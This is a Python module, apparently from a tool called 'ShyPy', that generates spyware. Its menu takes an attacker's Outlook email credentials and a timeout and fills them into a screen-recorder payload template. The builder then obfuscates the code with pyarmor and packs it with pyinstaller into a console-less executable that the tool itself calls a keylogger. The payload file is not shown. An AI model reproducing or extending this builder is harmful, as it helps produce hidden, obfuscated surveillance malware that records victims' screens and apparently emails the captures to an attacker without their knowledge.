import time
import os
import platform

from shypy import Shypy

OS = platform.system().lower()

colors = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'ZERO': '\033[0m'
}

class Screen_Recorder():
    def __init__(self):
        self.user_name = ""
        self.user_password = ""
        self.time_out = ""

    def ScreenRecorder(self, name, user_mail, user_mail_password, time_out):
        if platform.system() == "Windows":
            os.system("cls")
            file_name = "Modules\Screen_Recorder\Payloads\DefaultPayload.txt"
        else:
            os.system("clear")
            file_name = "Modules/Screen_Recorder/Payloads/DefaultPayload.txt"

        file_loc = os.path.abspath(os.path.join(os.getcwd(),file_name))
        
        with open(name, "w", encoding="utf-8") as file:
            
            with open(file_loc, 'r', encoding='utf-8') as file1:  
                file_content = file1.read()
                file_content = file_content.replace("{user_mail}", user_mail)
                file_content = file_content.replace("{user_password}", user_mail_password)
                file_content = file_content.replace("{time_out}", time_out)
                file.write(file_content)

    def obfuscate(self, name):
        try:
            os.system(f"pyarmor gen {name}")
        
        except Exception as e:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} ERROR: {str(e)}")

    def convert_to_exe(self, name, icon=""):
        if icon == "":
            if OS == "windows":
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=smtplib --hidden-import=tempfile --hidden-import=pyautogui --hidden-import=email  --hidden-import=threading --clean dist/{name}")

            else:
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=smtplib --hidden-import=tempfile --hidden-import=pyautogui --hidden-import=email --hidden-import=threading dist/{name}")
        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Name Invalid")
            
    def ended(self, name):
        if OS == "windows":
            os.remove(name)
            os.remove(f"dist\{name}")
        else:
            os.remove(name)
            os.remove(f"dist/{name}")

        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        self.clear()
        if OS == "windows":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Keylogger Was Created On this Location: {self.dist_folder}\dist\{exe_location}")    

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Keylogger Was Created On this Location: {self.dist_folder}/dist/{exe_location}")

    def start(self):
        self.clear()
        print(f"""
            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                        - Screen Recorder -                         *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║ RULES : Outlook.com Should Be Used As The e-mail Address.            ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "set.mail"                       : Set Mail Adress.                  ║ 
            ║ "set.password"                   : Set Mail Password.                ║
            ║ "set.timeout"                    : Set Time Out.                     ║ 
            ║ "generate"                       : Generate a Screen Recorder.       ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╬═══════════════════════════════════╣
            ║*            E-Mail               : {self.user_name}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*           Password              : {self.user_password}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*          Time Out               : {self.time_out}
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input(f"{colors['RED']}[ShyPy] =>{colors['ZERO']} ").lower() 
        if answer.startswith("set.mail "):
            answer = answer.replace('set.mail ', '') 
            self.user_name = answer
            self.start() 
            
        elif answer.startswith("set.password "):
            answer = answer.replace('set.password ', '') 
            self.user_password = answer
            self.start()
            
        elif answer.startswith("set.timeout "):
            answer = answer.replace('set.timeout ', '') 
            self.time_out = answer
            self.start()

        elif answer == "set.mail":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.mail <EMAIL>")
            time.sleep(0.5)
            self.start()

        elif answer == "set.password":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.password <PASSWORD>")
            time.sleep(0.5)
            self.start()

        elif answer == "set.timeout":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.timeout <TIMEOUT>")
            time.sleep(0.5)
            self.start()
                     
        elif answer == "generate":
            user_sm_name = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Name Of The User's Screen Recorder: ")
            user_sm_icon = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Icon Of Keylogger (Optional): ")
            user_sm_name = user_sm_name + ".py"
            self.ScreenRecorder(user_sm_name, self.user_name, self.user_password, self.time_out)
            self.obfuscate(user_sm_name)
            self.convert_to_exe(user_sm_name, user_sm_icon)
            self.ended(user_sm_name)

        elif answer == "back":
            s = Shypy()
            s.program_menu()

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid Option")
            time.sleep(0.5)
            self.start()

    def clear(self):
        if OS == "windows":
            os.system("cls")

        else:
            os.system("clear")
